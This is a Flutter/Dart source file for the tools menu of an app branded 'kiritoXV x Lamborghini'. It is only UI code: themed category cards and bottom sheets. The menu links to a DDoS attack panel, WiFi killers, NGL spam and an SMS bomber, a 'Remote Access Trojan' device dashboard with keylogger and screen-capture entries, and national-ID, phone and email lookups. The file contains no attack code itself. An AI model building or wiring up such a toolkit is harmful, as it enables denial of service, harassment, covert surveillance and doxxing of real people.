import 'dart:math' as math;
import 'package:flutter/material.dart';
import 'manage_server.dart';
import 'wifi_internal.dart';
import 'wifi_external.dart';
import 'ddos_panel.dart';
import 'nik_check.dart';
import 'tiktok_page.dart';
import 'instagram_page.dart';
import 'qr_gen.dart';
import 'domain_page.dart';
import 'spam_ngl.dart';
import 'phone_lookup.dart';
import 'email_osint.dart';
import 'ip_scanner.dart';
import 'port_scanner.dart';
import 'dracin_page.dart';
import 'device_dashboard.dart';
import 'anime_home.dart';
import 'hentai.dart';

// ─── Palette: kiritoXV x Lamborghini Theme (Merah, Biru, Kuning) ──────────────────────────
class _C {
  static const bg        = Color(0xFF0A0A1A);
  static const surface   = Color(0xFF111128);
  static const card      = Color(0xFF1A1A35);
  static const cardInner = Color(0xFF222245);
  static const border    = Color(0xFF2A2A50);
  static const borderLit = Color(0xFF3A3A60);

  // Warna utama kiritoXV x Lamborghini - Merah, Biru, Kuning
  static const primary   = Color(0xFFFF3B30); // Merah
  static const primaryDark = Color(0xFFD32F2F);
  static const primaryLight = Color(0xFFFF6B6B);
  
  static const secondary = Color(0xFF2196F3); // Biru
  static const secondaryDark = Color(0xFF1976D2);
  static const secondaryLight = Color(0xFF64B5F6);
  
  static const tertiary  = Color(0xFFFFD700); // Kuning
  static const tertiaryDark = Color(0xFFF9A825);
  static const tertiaryLight = Color(0xFFFFF176);
  
  static const accent    = Color(0xFFE53935);
  
  static const red       = Color(0xFFFF4444);
  static const blue      = Color(0xFF42A5F5);
  static const yellow    = Color(0xFFFFD700);
  static const amber     = Color(0xFFFFA726);
  static const green     = Color(0xFF4CAF50);
  static const purple    = Color(0xFF9C27B0);
  static const pink      = Color(0xFFFF4081);
  static const teal      = Color(0xFF26A69A);

  static const text      = Color(0xFFF5F5F5);
  static const textSub   = Color(0xFF9E9E9E);
  static const textDim   = Color(0xFF616161);

  static const LinearGradient primaryGrad = LinearGradient(
    colors: [primaryDark, primary, secondary, tertiary],
    begin: Alignment.topLeft,
    end: Alignment.bottomRight,
  );
  
  static const LinearGradient hdGrad = LinearGradient(
    colors: [primary, secondary, tertiary],
    begin: Alignment.topLeft,
    end: Alignment.bottomRight,
    stops: [0.0, 0.5, 1.0],
  );
}

// ─── Tool Category Data ──────────────────────────────────────────────────────
class _ToolCategory {
  final String id;
  final String title;
  final String subtitle;
  final IconData icon;
  final Color accent;
  final Color bgColor;

  const _ToolCategory({
    required this.id,
    required this.title,
    required this.subtitle,
    required this.icon,
    required this.accent,
    required this.bgColor,
  });
}

// 9 kategori dengan warna merah, biru, kuning
const _categories = [
  _ToolCategory(
    id: 'ddos',
    title: 'DDos Tools',
    subtitle: 'Attack & Server',
    icon: Icons.flash_on_rounded,
    accent: _C.red,
    bgColor: _C.primary,
  ),
  _ToolCategory(
    id: 'network',
    title: 'Network',
    subtitle: 'WiFi & Spam',
    icon: Icons.wifi_rounded,
    accent: _C.blue,
    bgColor: _C.secondary,
  ),
  _ToolCategory(
    id: 'osint',
    title: 'OSINT',
    subtitle: 'Investigation',
    icon: Icons.search_rounded,
    accent: _C.yellow,
    bgColor: _C.tertiary,
  ),
  _ToolCategory(
    id: 'downloader',
    title: 'Downloader',
    subtitle: 'Social Media',
    icon: Icons.download_rounded,
    accent: _C.red,
    bgColor: _C.primary,
  ),
  _ToolCategory(
    id: 'streaming',
    title: 'Streaming',
    subtitle: 'Motion & Telegram',
    icon: Icons.play_circle_rounded,
    accent: _C.blue,
    bgColor: _C.secondary,
  ),
  _ToolCategory(
    id: 'ai',
    title: 'Ai Assistant',
    subtitle: 'Tanya A. Pintar',
    icon: Icons.auto_awesome_rounded,
    accent: _C.yellow,
    bgColor: _C.tertiary,
  ),
  _ToolCategory(
    id: 'ratcontrol',
    title: 'kiritoXV x Lamborghini RAT',
    subtitle: 'Remote Access Trojan',
    icon: Icons.devices_rounded,
    accent: _C.red,
    bgColor: _C.primary,
  ),
  _ToolCategory(
    id: 'generator',
    title: 'Generator',
    subtitle: 'Buat & Edit',
    icon: Icons.build_rounded,
    accent: _C.blue,
    bgColor: _C.secondary,
  ),
  _ToolCategory(
    id: 'hosting',
    title: 'Hosting',
    subtitle: 'Panel & Ubot',
    icon: Icons.cloud_queue_rounded,
    accent: _C.yellow,
    bgColor: _C.tertiary,
  ),
];

// ─── Page ─────────────────────────────────────────────────────────────────────
class ToolsPage extends StatefulWidget {
  final String sessionKey;
  final String userRole;
  final List<Map<String, dynamic>> listDoos;

  const ToolsPage({
    super.key,
    required this.sessionKey,
    required this.userRole,
    required this.listDoos,
  });

  @override
  State<ToolsPage> createState() => _ToolsPageState();
}

class _ToolsPageState extends State<ToolsPage> with TickerProviderStateMixin {
  late AnimationController _bgCtrl;
  late AnimationController _headerCtrl;
  late Animation<double> _headerFade;
  late Animation<Offset> _headerSlide;

  @override
  void initState() {
    super.initState();
    _bgCtrl = AnimationController(
        vsync: this, duration: const Duration(seconds: 16))
      ..repeat();

    _headerCtrl = AnimationController(
        vsync: this, duration: const Duration(milliseconds: 700));
    _headerFade =
        CurvedAnimation(parent: _headerCtrl, curve: Curves.easeOut);
    _headerSlide =
        Tween<Offset>(begin: const Offset(0, -0.2), end: Offset.zero)
            .animate(CurvedAnimation(
                parent: _headerCtrl, curve: Curves.easeOutCubic));
    _headerCtrl.forward();
  }

  @override
  void dispose() {
    _bgCtrl.dispose();
    _headerCtrl.dispose();
    super.dispose();
  }

  void _push(Widget page) =>
      Navigator.push(context, _slideRoute(page));

  void _comingSoon() {
    ScaffoldMessenger.of(context).showSnackBar(SnackBar(
      content: const Row(children: [
        Icon(Icons.hourglass_top_rounded, color: Colors.white, size: 16),
        SizedBox(width: 8),
        Text('Coming Soon!',
            style: TextStyle(
                color: Colors.white, fontWeight: FontWeight.w600)),
      ]),
      backgroundColor: _C.primary,
      behavior: SnackBarBehavior.floating,
      margin: const EdgeInsets.fromLTRB(16, 0, 16, 16),
      shape:
          RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
      duration: const Duration(seconds: 2),
    ));
  }

  void _onCategoryTap(String id) {
    switch (id) {
      case 'ddos':
        _showSheet(_ddosItems());
        break;
      case 'network':
        _showSheet(_networkItems());
        break;
      case 'osint':
        _showSheet(_osintItems());
        break;
      case 'downloader':
        _showSheet(_downloaderItems());
        break;
      case 'streaming':
        _showSheet(_streamingItems());
        break;
      case 'ai':
        _comingSoon();
        break;
      case 'ratcontrol':
        _showSheet(_ratcontrolItems());
        break;
      case 'generator':
        _showSheet(_generatorItems());
        break;
      case 'hosting':
        _comingSoon();
        break;
    }
  }

  List<_ToolItem> _ddosItems() => [
        _ToolItem(
            icon: Icons.flash_on_rounded,
            label: 'Attack Panel',
            accent: _C.red,
            onTap: () => _push(AttackPanel(
                sessionKey: widget.sessionKey,
                listDoos: widget.listDoos))),
        _ToolItem(
            icon: Icons.gavel_rounded,
            label: 'Stress Test',
            accent: _C.red,
            comingSoon: true,
            onTap: () {}),
      ];

  List<_ToolItem> _networkItems() => [
        _ToolItem(
            icon: Icons.message_rounded,
            label: 'Spam NGL',
            accent: _C.blue,
            onTap: () => _push(NglPage())),
        _ToolItem(
            icon: Icons.wifi_off_rounded,
            label: 'WiFi Killer (Internal)',
            accent: _C.blue,
            onTap: () => _push(WifiKillerPage())),
        if (widget.userRole == 'vip' || widget.userRole == 'owner')
          _ToolItem(
              icon: Icons.router_rounded,
              label: 'WiFi Killer (External)',
              accent: _C.blue,
              onTap: () => _push(
                  WifiInternalPage(sessionKey: widget.sessionKey))),
        _ToolItem(
            icon: Icons.sms_rounded,
            label: 'SMS Bomber',
            accent: _C.blue,
            comingSoon: true,
            onTap: () {}),
      ];

  List<_ToolItem> _osintItems() => [
        _ToolItem(
            icon: Icons.badge_outlined,
            label: 'NIK Detail',
            accent: _C.yellow,
            onTap: () => _push(const NikCheckerPage())),
        _ToolItem(
            icon: Icons.travel_explore_rounded,
            label: 'Domain OSINT',
            accent: _C.yellow,
            onTap: () => _push(const DomainOsintPage())),
        _ToolItem(
            icon: Icons.person_search_rounded,
            label: 'Phone Lookup',
            accent: _C.yellow,
            onTap: () => _push(const PhoneLookupPage())),
        _ToolItem(
            icon: Icons.alternate_email_rounded,
            label: 'Email OSINT',
            accent: _C.yellow,
            onTap: () => _push(const EmailOsintPage())),
        _ToolItem(
            icon: Icons.fingerprint_rounded,
            label: 'Username Search',
            accent: _C.yellow,
            comingSoon: true,
            onTap: () {}),
      ];

  List<_ToolItem> _downloaderItems() => [
        _ToolItem(
            icon: Icons.video_library_rounded,
            label: 'TikTok Downloader',
            accent: _C.red,
            onTap: () => _push(const TiktokDownloaderPage())),
        _ToolItem(
            icon: Icons.camera_alt_rounded,
            label: 'Instagram Downloader',
            accent: _C.red,
            onTap: () => _push(const InstagramDownloaderPage())),
        _ToolItem(
            icon: Icons.music_note_rounded,
            label: 'YouTube Downloader',
            accent: _C.red,
            comingSoon: true,
            onTap: () {}),
      ];

  List<_ToolItem> _streamingItems() => [
        _ToolItem(
            icon: Icons.animation_rounded,
            label: 'Anime',
            accent: _C.blue,
            onTap: () => _push(const HomeAnimePage())),
        _ToolItem(
            icon: Icons.play_circle_rounded,
            label: 'Dracin',
            accent: _C.blue,
            onTap: () => _push(const DracinPage())),
        _ToolItem(
            icon: Icons.telegram_rounded,
            label: 'Telegram Stream',
            accent: _C.blue,
            comingSoon: true,
            onTap: () {}),
      ];
      
  List<_ToolItem> _ratcontrolItems() => [
        _ToolItem(
            icon: Icons.devices_rounded,
            label: 'MALWERE',
            accent: _C.red,
            onTap: () => _push(const DeviceDashboardPage())),
        _ToolItem(
            icon: Icons.screen_share_rounded,
            label: 'Screen Capture',
            accent: _C.red,
            comingSoon: true,
            onTap: () {}),
        _ToolItem(
            icon: Icons.keyboard_rounded,
            label: 'Keylogger',
            accent: _C.red,
            comingSoon: true,
            onTap: () {}),
      ];
      
  List<_ToolItem> _generatorItems() => [
        _ToolItem(
            icon: Icons.qr_code_2_rounded,
            label: 'QR Generator',
            accent: _C.blue,
            onTap: () => _push(const QrGeneratorPage())),
        _ToolItem(
            icon: Icons.text_fields_rounded,
            label: 'Text Generator',
            accent: _C.blue,
            comingSoon: true,
            onTap: () {}),
        _ToolItem(
            icon: Icons.image_rounded,
            label: 'Image Editor',
            accent: _C.blue,
            comingSoon: true,
            onTap: () {}),
      ];

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.transparent,
      body: Container(
        decoration: BoxDecoration(
          image: DecorationImage(
            image: AssetImage('assets/fitbul_2026.jpg'),
            fit: BoxFit.cover,
          ),
        ),
        child: Stack(
          children: [
            // Overlay gelap untuk readability
            Container(
              color: Colors.black.withOpacity(0.6),
            ),
            Positioned.fill(child: _AnimatedBg(controller: _bgCtrl)),
            SafeArea(
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  // ── App Header ──
                  FadeTransition(
                    opacity: _headerFade,
                    child: SlideTransition(
                      position: _headerSlide,
                      child: _buildAppHeader(),
                    ),
                  ),

                  // ── Section label "Tools kiritoXV x Lamborghini" ──
                  Padding(
                    padding: const EdgeInsets.fromLTRB(16, 20, 16, 12),
                    child: Row(
                      children: [
                        // Garis merah-biru-kuning
                        Container(
                          width: 4,
                          height: 20,
                          decoration: BoxDecoration(
                            gradient: LinearGradient(
                              colors: [_C.primary, _C.secondary, _C.tertiary],
                              begin: Alignment.topCenter,
                              end: Alignment.bottomCenter,
                            ),
                            borderRadius: BorderRadius.circular(2),
                          ),
                        ),
                        const SizedBox(width: 10),
                        ShaderMask(
                          shaderCallback: (bounds) => LinearGradient(
                            colors: [_C.primary, _C.secondary, _C.tertiary],
                            begin: Alignment.centerLeft,
                            end: Alignment.centerRight,
                          ).createShader(bounds),
                          child: const Text(
                            'Tools kiritoXV x Lamborghini',
                            style: TextStyle(
                              color: Colors.white,
                              fontSize: 16,
                              fontWeight: FontWeight.w700,
                            ),
                          ),
                        ),
                        const Spacer(),
                        Text(
                          '${_categories.length} item',
                          style: const TextStyle(
                              color: _C.textSub, fontSize: 13),
                        ),
                      ],
                    ),
                  ),

                  // ── Grid 2 kolom HD ──
                  Expanded(
                    child: SingleChildScrollView(
                      physics: const BouncingScrollPhysics(),
                      padding: const EdgeInsets.fromLTRB(12, 0, 12, 24),
                      child: GridView.builder(
                        shrinkWrap: true,
                        physics: const NeverScrollableScrollPhysics(),
                        gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(
                          crossAxisCount: 2,
                          crossAxisSpacing: 14,
                          mainAxisSpacing: 14,
                          childAspectRatio: 1.05,
                        ),
                        itemCount: _categories.length,
                        itemBuilder: (_, i) => _StaggerItem(
                          index: i,
                          child: _HDCategoryCard(
                            category: _categories[i],
                            onTap: () => _onCategoryTap(_categories[i].id),
                          ),
                        ),
                      ),
                    ),
                  ),
                ],
              ),
            ),
          ],
        ),
      ),
    );
  }

  // ── App bar kiritoXV x Lamborghini HD ──
  Widget _buildAppHeader() {
    return Padding(
      padding: const EdgeInsets.fromLTRB(16, 16, 16, 0),
      child: Row(
        children: [
          // Logo kotak dengan gradient merah-biru-kuning
          Container(
            width: 52,
            height: 52,
            decoration: BoxDecoration(
              gradient: LinearGradient(
                colors: [_C.primaryDark, _C.primary, _C.secondary, _C.tertiary],
                begin: Alignment.topLeft,
                end: Alignment.bottomRight,
                stops: const [0.0, 0.3, 0.6, 1.0],
              ),
              borderRadius: BorderRadius.circular(14),
              boxShadow: [
                BoxShadow(
                    color: _C.primary.withOpacity(0.35),
                    blurRadius: 14,
                    offset: const Offset(0, 4)),
              ],
            ),
            child: const Icon(Icons.graphic_eq_rounded,
                color: Colors.white, size: 28),
          ),
          const SizedBox(width: 12),
          Column(
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              ShaderMask(
                shaderCallback: (bounds) => LinearGradient(
                  colors: [_C.primary, _C.secondary, _C.tertiary],
                  begin: Alignment.centerLeft,
                  end: Alignment.centerRight,
                ).createShader(bounds),
                child: const Text(
                  'kiritoXV x Lamborghini',
                  style: TextStyle(
                    color: Colors.white,
                    fontSize: 28,
                    fontWeight: FontWeight.w900,
                    letterSpacing: 2,
                  ),
                ),
              ),
              const Text(
                'Gateway Tools HD',
                style: TextStyle(color: _C.textSub, fontSize: 11),
              ),
            ],
          ),
          const Spacer(),
          // Badge USER dengan border gradient
          Container(
            padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 8),
            decoration: BoxDecoration(
              gradient: LinearGradient(
                colors: [_C.card, _C.surface],
                begin: Alignment.topLeft,
                end: Alignment.bottomRight,
              ),
              borderRadius: BorderRadius.circular(20),
              border: Border.all(
                color: _C.primary,
                width: 1.5,
              ),
            ),
            child: Row(
              children: [
                Container(
                  width: 8,
                  height: 8,
                  decoration: BoxDecoration(
                    gradient: LinearGradient(
                      colors: [_C.primary, _C.secondary, _C.tertiary],
                    ),
                    shape: BoxShape.circle,
                  ),
                ),
                const SizedBox(width: 6),
                Text(widget.userRole.toUpperCase(),
                    style: const TextStyle(
                        color: _C.text,
                        fontSize: 11,
                        fontWeight: FontWeight.w700)),
              ],
            ),
          ),
        ],
      ),
    );
  }

  void _showSheet(List<_ToolItem> items) {
    showModalBottomSheet(
      context: context,
      backgroundColor: Colors.transparent,
      isScrollControlled: true,
      useSafeArea: false,
      builder: (_) => _ToolSheet(items: items),
    );
  }
}

// ─── HD Category Card ──────────────────────────────────────────────────────────
class _HDCategoryCard extends StatefulWidget {
  final _ToolCategory category;
  final VoidCallback onTap;

  const _HDCategoryCard({required this.category, required this.onTap});

  @override
  State<_HDCategoryCard> createState() => _HDCategoryCardState();
}

class _HDCategoryCardState extends State<_HDCategoryCard>
    with SingleTickerProviderStateMixin {
  bool _pressed = false;
  late AnimationController _glowCtrl;
  late Animation<double> _glow;

  @override
  void initState() {
    super.initState();
    _glowCtrl = AnimationController(
        vsync: this,
        duration: const Duration(milliseconds: 1800))
      ..repeat(reverse: true);
    _glow = Tween<double>(begin: 0.15, end: 0.45).animate(
        CurvedAnimation(parent: _glowCtrl, curve: Curves.easeInOut));
  }

  @override
  void dispose() {
    _glowCtrl.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    final cat = widget.category;

    return GestureDetector(
      onTapDown: (_) => setState(() => _pressed = true),
      onTapUp: (_) {
        setState(() => _pressed = false);
        widget.onTap();
      },
      onTapCancel: () => setState(() => _pressed = false),
      child: AnimatedScale(
        scale: _pressed ? 0.93 : 1.0,
        duration: const Duration(milliseconds: 150),
        child: AnimatedBuilder(
          animation: _glow,
          builder: (_, __) => Container(
            decoration: BoxDecoration(
              gradient: LinearGradient(
                colors: [
                  _pressed ? cat.accent.withOpacity(0.3) : _C.card,
                  _pressed ? cat.accent.withOpacity(0.1) : _C.cardInner,
                ],
                begin: Alignment.topLeft,
                end: Alignment.bottomRight,
              ),
              borderRadius: BorderRadius.circular(28),
              border: Border.all(
                color: _pressed 
                    ? cat.accent.withOpacity(0.8) 
                    : cat.accent.withOpacity(0.3),
                width: _pressed ? 3.0 : 1.5,
              ),
              boxShadow: [
                BoxShadow(
                  color: cat.accent.withOpacity(_pressed ? 0.35 : 0.12),
                  blurRadius: _pressed ? 28 : 16,
                  spreadRadius: _pressed ? 4 : 2,
                  offset: const Offset(0, 6),
                ),
                BoxShadow(
                  color: Colors.black.withOpacity(0.3),
                  blurRadius: 8,
                  offset: const Offset(0, 2),
                ),
              ],
            ),
            child: Column(
              mainAxisAlignment: MainAxisAlignment.center,
              children: [
                // Icon HD dengan efek neon
                Container(
                  width: 78,
                  height: 78,
                  decoration: BoxDecoration(
                    gradient: LinearGradient(
                      colors: [
                        cat.accent.withOpacity(0.3),
                        cat.accent.withOpacity(0.05),
                      ],
                      begin: Alignment.topLeft,
                      end: Alignment.bottomRight,
                    ),
                    shape: BoxShape.circle,
                    border: Border.all(
                      color: cat.accent.withOpacity(0.5),
                      width: 2.5,
                    ),
                    boxShadow: [
                      BoxShadow(
                        color: cat.accent.withOpacity(0.3),
                        blurRadius: 20,
                        spreadRadius: 2,
                      ),
                    ],
                  ),
                  child: Icon(
                    cat.icon, 
                    color: cat.accent, 
                    size: 38,
                    shadows: [
                      Shadow(
                        color: cat.accent.withOpacity(0.5),
                        blurRadius: 10,
                      ),
                    ],
                  ),
                ),
                const SizedBox(height: 16),
                Padding(
                  padding: const EdgeInsets.symmetric(horizontal: 8),
                  child: Text(
                    cat.title,
                    textAlign: TextAlign.center,
                    maxLines: 1,
                    overflow: TextOverflow.ellipsis,
                    style: TextStyle(
                      color: _C.text,
                      fontSize: 16,
                      fontWeight: FontWeight.w800,
                      shadows: [
                        Shadow(
                          color: cat.accent.withOpacity(0.3),
                          blurRadius: 6,
                        ),
                      ],
                    ),
                  ),
                ),
                const SizedBox(height: 4),
                Padding(
                  padding: const EdgeInsets.symmetric(horizontal: 8),
                  child: Text(
                    cat.subtitle,
                    textAlign: TextAlign.center,
                    maxLines: 2,
                    overflow: TextOverflow.ellipsis,
                    style: const TextStyle(
                      color: _C.textSub,
                      fontSize: 11.5,
                      height: 1.3,
                      fontWeight: FontWeight.w500,
                    ),
                  ),
                ),
                // Indikator warna di bawah
                const SizedBox(height: 8),
                Container(
                  width: 40,
                  height: 3,
                  decoration: BoxDecoration(
                    gradient: LinearGradient(
                      colors: [cat.accent, _C.secondary, _C.tertiary],
                    ),
                    borderRadius: BorderRadius.circular(10),
                  ),
                ),
              ],
            ),
          ),
        ),
      ),
    );
  }
}

// ─── Tool Sheet ──────────────────────────────────────────────────────────────
class _ToolSheet extends StatelessWidget {
  final List<_ToolItem> items;
  const _ToolSheet({required this.items});

  @override
  Widget build(BuildContext context) {
    return Container(
      constraints: BoxConstraints(
        maxHeight: MediaQuery.of(context).size.height * 0.72,
      ),
      decoration: BoxDecoration(
        color: _C.surface.withOpacity(0.95),
        borderRadius: const BorderRadius.vertical(top: Radius.circular(28)),
        border: Border(
          top: BorderSide(
            color: _C.primary.withOpacity(0.4),
          ),
          left: BorderSide(color: _C.border),
          right: BorderSide(color: _C.border),
        ),
      ),
      child: Column(
        mainAxisSize: MainAxisSize.min,
        children: [
          Padding(
            padding: const EdgeInsets.only(top: 12, bottom: 8),
            child: Container(
              width: 40,
              height: 4,
              decoration: BoxDecoration(
                gradient: LinearGradient(
                  colors: [_C.primary, _C.secondary, _C.tertiary],
                ),
                borderRadius: BorderRadius.circular(100),
              ),
            ),
          ),
          Container(
            height: 1,
            margin: const EdgeInsets.symmetric(horizontal: 24),
            decoration: BoxDecoration(
              gradient: LinearGradient(
                colors: [
                  Colors.transparent,
                  _C.primary,
                  _C.secondary,
                  _C.tertiary,
                  Colors.transparent
                ],
              ),
            ),
          ),
          const SizedBox(height: 8),
          Flexible(
            child: ListView.separated(
              padding: const EdgeInsets.fromLTRB(16, 8, 16, 32),
              shrinkWrap: true,
              physics: const BouncingScrollPhysics(),
              itemCount: items.length,
              separatorBuilder: (_, __) => const SizedBox(height: 8),
              itemBuilder: (ctx, i) => _StaggerItem(
                index: i,
                child: _HDToolRow(
                  item: items[i],
                  onTap: () {
                    Navigator.pop(ctx);
                    items[i].onTap();
                  },
                ),
              ),
            ),
          ),
        ],
      ),
    );
  }
}

// ─── HD Tool Row ─────────────────────────────────────────────────────────────────
class _HDToolRow extends StatefulWidget {
  final _ToolItem item;
  final VoidCallback onTap;
  const _HDToolRow({required this.item, required this.onTap});

  @override
  State<_HDToolRow> createState() => _HDToolRowState();
}

class _HDToolRowState extends State<_HDToolRow> {
  bool _pressed = false;

  @override
  Widget build(BuildContext context) {
    final item = widget.item;
    return GestureDetector(
      onTapDown: (_) => setState(() => _pressed = true),
      onTapUp: (_) {
        setState(() => _pressed = false);
        widget.onTap();
      },
      onTapCancel: () => setState(() => _pressed = false),
      child: AnimatedContainer(
        duration: const Duration(milliseconds: 150),
        padding: const EdgeInsets.symmetric(horizontal: 18, vertical: 16),
        decoration: BoxDecoration(
          gradient: LinearGradient(
            colors: [
              _pressed ? item.accent.withOpacity(0.15) : _C.card.withOpacity(0.8),
              _pressed ? item.accent.withOpacity(0.05) : _C.surface.withOpacity(0.6),
            ],
            begin: Alignment.topLeft,
            end: Alignment.bottomRight,
          ),
          borderRadius: BorderRadius.circular(18),
          border: Border.all(
            color: _pressed ? item.accent.withOpacity(0.6) : _C.border.withOpacity(0.5),
            width: _pressed ? 2.5 : 1.0,
          ),
          boxShadow: _pressed
              ? [
                  BoxShadow(
                      color: item.accent.withOpacity(0.25),
                      blurRadius: 20,
                      spreadRadius: 2,
                      offset: const Offset(0, 6))
                ]
              : [
                  BoxShadow(
                      color: Colors.black.withOpacity(0.2),
                      blurRadius: 4,
                      offset: const Offset(0, 2))
                ],
        ),
        child: Row(children: [
          Container(
            width: 48,
            height: 48,
            decoration: BoxDecoration(
              gradient: LinearGradient(
                colors: [
                  item.accent.withOpacity(0.25),
                  item.accent.withOpacity(0.05),
                ],
                begin: Alignment.topLeft,
                end: Alignment.bottomRight,
              ),
              borderRadius: BorderRadius.circular(14),
              border: Border.all(
                color: item.accent.withOpacity(0.4),
                width: 2,
              ),
              boxShadow: [
                BoxShadow(
                  color: item.accent.withOpacity(0.2),
                  blurRadius: 12,
                ),
              ],
            ),
            child: Icon(
              item.icon, 
              color: item.accent, 
              size: 24,
              shadows: [
                Shadow(
                  color: item.accent.withOpacity(0.3),
                  blurRadius: 8,
                ),
              ],
            ),
          ),
          const SizedBox(width: 16),
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Text(item.label,
                    style: TextStyle(
                        color: _C.text,
                        fontSize: 15,
                        fontWeight: FontWeight.w700,
                        shadows: [
                          Shadow(
                            color: item.accent.withOpacity(0.2),
                            blurRadius: 4,
                          ),
                        ])),
                if (item.comingSoon)
                  const Text('Coming Soon',
                      style: TextStyle(
                          color: _C.textSub,
                          fontSize: 10.5,
                          fontWeight: FontWeight.w500)),
              ],
            ),
          ),
          item.comingSoon
              ? Container(
                  padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 4),
                  decoration: BoxDecoration(
                    gradient: LinearGradient(
                      colors: [_C.primary, _C.secondary, _C.tertiary],
                    ),
                    borderRadius: BorderRadius.circular(8),
                    boxShadow: [
                      BoxShadow(
                        color: _C.primary.withOpacity(0.3),
                        blurRadius: 8,
                      ),
                    ],
                  ),
                  child: const Text('SOON',
                      style: TextStyle(
                          color: Colors.white,
                          fontSize: 10,
                          fontWeight: FontWeight.w800,
                          letterSpacing: 0.5)),
                )
              : Container(
                  width: 34,
                  height: 34,
                  decoration: BoxDecoration(
                    gradient: LinearGradient(
                      colors: [
                        _pressed ? item.accent.withOpacity(0.2) : _C.surface.withOpacity(0.8),
                        _pressed ? item.accent.withOpacity(0.1) : _C.card.withOpacity(0.6),
                      ],
                    ),
                    borderRadius: BorderRadius.circular(11),
                    border: Border.all(
                      color: _pressed ? item.accent.withOpacity(0.5) : _C.border,
                      width: 1.5,
                    ),
                  ),
                  child: Icon(
                    Icons.arrow_forward_ios_rounded,
                    color: _pressed ? item.accent : _C.textSub,
                    size: 15,
                  ),
                ),
        ]),
      ),
    );
  }
}

// ─── Stagger Item ─────────────────────────────────────────────────────────────
class _StaggerItem extends StatelessWidget {
  final int index;
  final Widget child;
  const _StaggerItem({required this.index, required this.child});

  @override
  Widget build(BuildContext context) {
    return TweenAnimationBuilder<double>(
      tween: Tween(begin: 0, end: 1),
      duration: Duration(milliseconds: 350 + (index * 70).clamp(0, 450)),
      curve: Curves.easeOutCubic,
      builder: (_, v, ch) => Opacity(
        opacity: v,
        child: Transform.translate(
            offset: Offset(0, 18 * (1 - v)), child: ch),
      ),
      child: child,
    );
  }
}

// ─── Animated Background ──────────────────────────────────────────────────────
class _AnimatedBg extends StatelessWidget {
  final AnimationController controller;
  const _AnimatedBg({required this.controller});

  @override
  Widget build(BuildContext context) {
    return AnimatedBuilder(
      animation: controller,
      builder: (_, __) =>
          CustomPaint(painter: _BgPainter(controller.value)),
    );
  }
}

class _BgPainter extends CustomPainter {
  final double t;
  _BgPainter(this.t);

  @override
  void paint(Canvas canvas, Size size) {
    final grid = Paint()
      ..color = _C.border.withOpacity(0.2)
      ..strokeWidth = 0.5;
    const step = 44.0;
    for (double x = 0; x < size.width; x += step) {
      canvas.drawLine(
          Offset(x, 0), Offset(x, size.height), grid);
    }
    for (double y = 0; y < size.height; y += step) {
      canvas.drawLine(
          Offset(0, y), Offset(size.width, y), grid);
    }

    final glow = Paint()
      ..shader = RadialGradient(colors: [
        _C.primary.withOpacity(0.08 + math.sin(t * math.pi * 2) * 0.03),
        _C.secondary.withOpacity(0.06),
        _C.tertiary.withOpacity(0.04),
        Colors.transparent,
      ], radius: 0.9)
          .createShader(Rect.fromCircle(
              center: Offset(size.width / 2, 0),
              radius: size.width));
    canvas.drawCircle(
        Offset(size.width / 2, 0), size.width, glow);
  }

  @override
  bool shouldRepaint(_BgPainter old) => old.t != t;
}

// ─── Page transition ──────────────────────────────────────────────────────────
PageRoute _slideRoute(Widget page) => PageRouteBuilder(
      pageBuilder: (_, __, ___) => page,
      transitionDuration: const Duration(milliseconds: 350),
      transitionsBuilder: (_, anim, __, child) =>
          SlideTransition(
        position: Tween<Offset>(
          begin: const Offset(1, 0),
          end: Offset.zero,
        ).animate(CurvedAnimation(
            parent: anim, curve: Curves.easeOutCubic)),
        child: FadeTransition(opacity: anim, child: child),
      ),
    );

// ─── Data model ───────────────────────────────────────────────────────────────
class _ToolItem {
  final IconData icon;
  final String label;
  final Color accent;
  final VoidCallback onTap;
  final bool comingSoon;

  const _ToolItem({
    required this.icon,
    required this.label,
    required this.accent,
    required this.onTap,
    this.comingSoon = false,
  });
}